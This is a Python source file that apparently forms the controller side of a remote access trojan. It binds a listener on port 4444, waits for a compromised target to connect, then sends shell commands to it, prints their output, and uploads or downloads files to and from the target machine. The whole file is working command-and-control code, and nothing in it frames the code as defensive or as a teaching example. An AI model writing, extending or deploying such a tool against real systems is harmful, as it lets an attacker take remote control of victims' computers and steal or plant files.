import socket
import json
import os

#send command to target
def send_command(command):
	command_dump = json.dumps(command)
	ratconnection.send(command_dump.encode())

#receives command output from target
def get_response():
	output = ratconnection.recv(1024).decode()
	return json.loads(output)


#upload file to target machine
def send_file(file_name):
	with open(file_name, 'rb')as file:
		ratconnection.send(file.read())
	print("[+] {} uploaded".format(file_name))

def get_file(file_name):
	ratconnection.settimeout(5)
	with open(file_name, 'wb')as file:
		while True:
			try:
				fragment = ratconnection.recv(1024)
				file.write(fragment)
			except:
				break
	ratconnection.settimeout(None)
	print("[+] {} downloaded".format(file_name))


#Main function 
def communicationchannel(ip):
	while True:
		command = input("$ Shell{}: ".format(str(ip)))
		send_command(command)
		if command == 'quit':
			break
		elif command[:3] == 'cd ':
			pass
		elif command[:8] == 'download':
			get_file(command[9:])
		elif command[:6] == 'upload':
			send_file(command[7:])
		elif command == 'clear':
			os.system('cls')
		else:
			result = get_response()
			print(result)



soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.bind(("10.0.0.171",4444))
print("[+] Listening for connection")
soc.listen(5)
ratconnection, ip = soc.accept()
print("[+] Connected to " + str(ip))
communicationchannel(ip)
